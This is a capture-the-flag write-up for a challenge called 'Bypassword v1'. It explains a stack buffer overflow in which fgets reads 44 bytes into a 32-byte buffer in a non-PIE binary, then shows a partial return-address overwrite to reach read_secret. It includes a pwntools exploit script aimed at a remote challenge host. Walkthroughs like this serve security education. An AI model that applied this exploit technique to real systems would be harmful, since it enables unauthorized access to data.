# Bypassword v1

## Solution
We are given only the executable for this challenge. Looking at it in Ghidra, we can see that there is a function called `read_secret` that reads `flag.txt`. We can also see
that there is a 32 byte buffer in `menu`.
```c
char buf [32];
```
This buffer later has 44 vytes read into it, giving us a buffer overflow vulnerability.
```c
fgets(buf,44,stdin);
```
Furthermore, PIE is not enabled.
Considering the saved `RBP` address, we can only override the bottom 4 bytes of the saved return address. However, that is all that is necessary since the saved return address points to a location in `main`, whose bottom 2 bytes are the only ones that differ from the address of `read_secret`. So, the solution is a buffer overflow and then overriding the saved return address to jump to the second instruction `read_secret` for stack alignment reasons.

## Script
```py
from pwn import *

#p = process("./bypassword_v1")
p = remote('154.57.164.61', 32147)

p.sendline(b'2')
pause()
p.sendline(b'a'*(0x2c-4) + b'\xdd\x14\x40')

p.interactive()
```
